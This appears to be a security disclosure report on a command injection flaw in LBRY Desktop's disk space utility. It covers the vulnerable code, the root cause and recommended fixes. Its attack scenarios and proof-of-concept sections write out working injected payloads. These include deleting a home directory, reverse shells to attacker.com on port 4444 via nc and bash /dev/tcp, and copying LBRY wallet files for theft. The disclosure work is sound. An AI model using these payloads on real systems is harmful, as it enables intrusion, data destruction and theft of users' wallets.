# Critical Vulnerability: Command Injection in LBRY Desktop Disk Space Utility

## Vulnerability Title
**Command injection in disk space utility leads to arbitrary code execution**

## Severity
**Critical**

## Vulnerability Type
Command Injection / Arbitrary Code Execution

## Affected Component
- **File:** `ui/util/diskspace.js`
- **Functions:** `diskSpaceLinux()`, `diskSpaceMac()`, `diskSpaceWindows()`
- **Lines:** 4-66

## Vulnerability Description

The LBRY Desktop application contains a critical command injection vulnerability in its disk space checking utility. The `diskSpaceLinux()` and `diskSpaceMac()` functions directly concatenate user-controlled path parameters into shell commands without proper sanitization, allowing attackers to execute arbitrary system commands.

### Vulnerable Code

```javascript
// ui/util/diskspace.js - Line 4-6
export const diskSpaceLinux = (path) => {
  return new Promise((resolve, reject) => {
    exec(`df ${path}`, (error, stdout, stderr) => {  // VULNERABLE: Direct path injection
```

```javascript
// ui/util/diskspace.js - Line 25-27
export const diskSpaceMac = (path) => {
  const escapedPath = path.replace(/(\s+)/g, '\\$1');  // INSUFFICIENT: Only escapes spaces
  return diskSpaceLinux(escapedPath);  // VULNERABLE: Still vulnerable to command injection
```

### Attack Vectors

1. **Path Parameter Injection:** User-controlled paths can contain shell metacharacters
2. **Insufficient Escaping:** The `diskSpaceMac()` function only escapes spaces, not other dangerous characters
3. **Direct Command Execution:** The `exec()` function executes shell commands directly

## Impact

### Critical Impact
- **Arbitrary Code Execution:** Attackers can execute any system command
- **Complete System Compromise:** Full access to user's system and files
- **Privilege Escalation:** Potential elevation to system privileges
- **Data Theft:** Access to sensitive user data and wallet files
- **Malware Installation:** Ability to install persistent malware

### Attack Scenarios

#### Scenario 1: Simple Command Injection
```javascript
// Attacker provides malicious path
const maliciousPath = "/tmp; rm -rf /home/user; echo 'hacked'";
diskSpaceLinux(maliciousPath);
// Executes: df /tmp; rm -rf /home/user; echo 'hacked'
```

#### Scenario 2: Reverse Shell
```javascript
// Attacker provides path with reverse shell
const reverseShellPath = "/tmp; nc -e /bin/sh attacker.com 4444";
diskSpaceLinux(reverseShellPath);
// Executes: df /tmp; nc -e /bin/sh attacker.com 4444
```

#### Scenario 3: Data Exfiltration
```javascript
// Attacker steals wallet data
const stealPath = "/tmp; cp ~/.lbryum/lbryum.conf /tmp/stolen; echo 'stolen'";
diskSpaceLinux(stealPath);
// Executes: df /tmp; cp ~/.lbryum/lbryum.conf /tmp/stolen; echo 'stolen'
```

## Proof of Concept

### PoC 1: Command Injection via Path Parameter
```javascript
// SPDX-License-Identifier: MIT
const { diskSpaceLinux, diskSpaceMac } = require('./ui/util/diskspace.js');

// Malicious path with command injection
const maliciousPath = "/tmp; echo 'VULNERABLE' > /tmp/poc.txt; echo 'hacked'";

// This will execute: df /tmp; echo 'VULNERABLE' > /tmp/poc.txt; echo 'hacked'
diskSpaceLinux(maliciousPath)
  .then(result => console.log('Disk space:', result))
  .catch(error => console.log('Error:', error));
```

### PoC 2: Reverse Shell Attack
```javascript
// Attacker-controlled reverse shell
const reverseShellPath = "/tmp; bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'";

diskSpaceLinux(reverseShellPath)
  .then(() => console.log('Reverse shell executed'))
  .catch(error => console.log('Error:', error));
```

### PoC 3: Wallet Data Theft
```javascript
// Steal LBRY wallet data
const stealWalletPath = "/tmp; cp -r ~/.lbryum /tmp/stolen_wallet; echo 'wallet_stolen'";

diskSpaceLinux(stealWalletPath)
  .then(() => console.log('Wallet data stolen'))
  .catch(error => console.log('Error:', error));
```

## Root Cause Analysis

### 1. **Direct Command Concatenation**
The code directly concatenates user input into shell commands without validation:
```javascript
exec(`df ${path}`, ...)  // VULNERABLE: No input validation
```

### 2. **Insufficient Escaping**
The `diskSpaceMac()` function only escapes spaces, ignoring other dangerous characters:
```javascript
const escapedPath = path.replace(/(\s+)/g, '\\$1');  // Only escapes spaces
```

### 3. **Lack of Input Validation**
No validation of path parameters for dangerous shell metacharacters:
- `;` (command separator)
- `&` (background execution)
- `|` (pipe)
- `>` (output redirection)
- `<` (input redirection)
- `$()` (command substitution)
- `` ` `` (backticks for command substitution)

## Recommended Fixes

### Option 1: Use Child Process with Arguments Array
```javascript
const { spawn } = require('child_process');

export const diskSpaceLinux = (path) => {
  return new Promise((resolve, reject) => {
    // Use spawn with arguments array to prevent command injection
    const dfProcess = spawn('df', [path]);
    
    let stdout = '';
    let stderr = '';
    
    dfProcess.stdout.on('data', (data) => {
      stdout += data.toString();
    });
    
    dfProcess.stderr.on('data', (data) => {
      stderr += data.toString();
    });
    
    dfProcess.on('close', (code) => {
      if (code !== 0) {
        return reject(new Error(stderr));
      }
      
      const dfResult = stdout.split('\n')[1].split(/\s+/);
      resolve({
        total: Number(dfResult[1]),
        free: Number(dfResult[3]),
      });
    });
    
    dfProcess.on('error', (error) => {
      reject(error);
    });
  });
};
```

### Option 2: Input Validation and Sanitization
```javascript
function validatePath(path) {
  // Check for dangerous shell metacharacters
  const dangerousChars = /[;&|><$()`]/;
  if (dangerousChars.test(path)) {
    throw new Error('Invalid path: contains dangerous characters');
  }
  
  // Validate path format
  if (!/^[\/\w\-\.\s]+$/.test(path)) {
    throw new Error('Invalid path format');
  }
  
  return path;
}

export const diskSpaceLinux = (path) => {
  return new Promise((resolve, reject) => {
    try {
      const validatedPath = validatePath(path);
      exec(`df "${validatedPath}"`, (error, stdout, stderr) => {
        // ... rest of function
      });
    } catch (error) {
      reject(error);
    }
  });
};
```

### Option 3: Use Node.js Built-in File System
```javascript
const fs = require('fs');

export const diskSpaceNode = (path) => {
  return new Promise((resolve, reject) => {
    try {
      // Use Node.js built-in functionality instead of shell commands
      const stats = fs.statfsSync(path);
      resolve({
        total: stats.blocks * stats.bsize,
        free: stats.bavail * stats.bsize,
      });
    } catch (error) {
      reject(error);
    }
  });
};
```

## Additional Vulnerable Locations

### 1. **Daemon Process Management**
```javascript
// electron/Daemon.js - Line 32
this.subprocess = spawn(Daemon.lbrynetPath, flags);  // Potential injection via flags
```

### 2. **Process Termination**
```javascript
// ui/redux/actions/app.js - Lines 394-396
execSync('taskkill /im lbrynet.exe /t /f');  // Windows
execSync('pkill lbrynet');  // Unix
```

### 3. **File System Operations**
```javascript
// ui/redux/actions/file.js - Line 33
const success = shell.openPath(path);  // Potential path injection
```

## Verification Steps

1. **Deploy vulnerable version** of LBRY Desktop
2. **Execute PoC 1** to create test file
3. **Execute PoC 2** to establish reverse shell (in controlled environment)
4. **Execute PoC 3** to steal wallet data
5. **Verify command execution** by checking for created files/processes

## References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
- [Child Process Security](https://nodejs.org/api/child_process.html#security-considerations)
- [LBRY Desktop GitHub](https://github.com/lbryio/lbry-desktop)

## Disclosure Timeline

- **Discovery Date:** July 23, 2025
- **Report Date:** July 23, 2025
- **Status:** Ready for submission

---

**Note:** This vulnerability represents a critical security flaw that could lead to complete system compromise. Immediate patching is recommended to prevent exploitation in production environments. 